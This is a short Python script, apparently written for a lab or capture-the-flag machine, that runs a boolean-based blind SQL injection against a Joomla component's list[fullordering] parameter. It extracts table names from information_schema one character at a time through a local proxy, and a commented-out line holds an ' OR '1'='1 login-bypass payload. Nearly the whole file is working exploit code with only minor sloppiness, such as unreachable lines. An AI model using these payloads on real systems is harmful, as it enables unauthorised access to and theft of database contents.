import os
import requests

import sys





for i in range(100):
    print("")


proxies = {"http":"http://127.0.0.1:8080"}

print("running...")
print()

target = "http://10.10.180.67/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)"
t2 = target.replace("1573=1573", "1573=1572")
tested = False
condition = "1573=1573"

#target = "http://10.10.180.67/s3cret_manag3r_pag3.php?name=' OR '1'='1"

#test = "Config correctly set"
test = "The most recent request was denied because it contained an invalid security token. Please refresh the page and try again."

chars = " -_abcdefghijklmnopqrstuvwxyz123456789}{)($£!@./\\*][~';:,><`¬%\"\n0"
#chars = "0123456789"

def check(st):
    r = requests.get(st, proxies=proxies, allow_redirects=False)
    #print(len(r.text))

    #print(st, r.status_code, len(r.text))
    if r.status_code == 303:
        return True
    else: 
        return False
    if test in r.text:
        return True
    else:
        return False


tmp = ""



flip = True
answers = []
chars = range(33,96)

j = int(sys.argv[1])

tmp = "{}: ".format(j)
tmpp = ""
notFound = False
letterFound = True

for i in range(1,len(sys.argv[2])): # character position
    char = ord(sys.argv[2][i-1])

    test = "SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)=char({})".format(j, i, char)
    query = target.replace(condition, test)

    if check(query):
        tmp += str(chr(char))
        print(tmp)
        letterFound = True
    

            




    
    answers.append(tmp)























#for answer in answers:
#    print(answer)
    

